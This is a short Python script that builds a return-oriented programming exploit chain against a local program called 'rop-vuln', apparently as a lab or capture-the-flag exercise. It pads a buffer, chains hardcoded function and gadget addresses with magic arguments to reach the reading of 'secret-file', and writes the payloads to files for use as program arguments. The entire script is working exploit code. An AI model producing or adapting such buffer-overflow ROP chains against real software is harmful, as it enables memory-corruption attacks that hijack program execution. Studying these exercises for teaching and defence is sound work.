import struct 
#import os

food = 0x80484c0
feeling_sick = 0x804850d
lazy = 0x804849b

pop_ret = 0x0804850b
trePopRet = 0x080486a9
#perche' non 0x08048509?

magic = 0xdeadbeef
magic1 = 0xd15ea5e
magic2 = 0x0badf00d

filename_addr = 0xbffff17b
filename = "secret-file"
exit = 0xb7e337f0

atk_vector2 = "a" * 50 + filename

atk_vector1 = "a" * 112
atk_vector1 += struct.pack('I',food)
atk_vector1 += struct.pack('I',pop_ret)
atk_vector1 += struct.pack('I',magic)
atk_vector1 += struct.pack('I',feeling_sick)
atk_vector1 += struct.pack('I',trePopRet)
atk_vector1 += struct.pack('I',magic1)
atk_vector1 += struct.pack('I',magic2)
atk_vector1 += struct.pack('I',filename_addr)
atk_vector1 += struct.pack('I',lazy)
atk_vector1 += struct.pack('I',exit)


#os.system("./rop-vuln {} {}".format(atk_vector1, atk_vector2))

#print  atk_vector1 + " " + "A"*50 + filename

f = open('badfile1', 'w+')
f.write(atk_vector1)
f.close()

f = open('badfile2', 'w+')
f.write(atk_vector2)
f.close()

#r $(cat badfile1) $(cat badfile2)







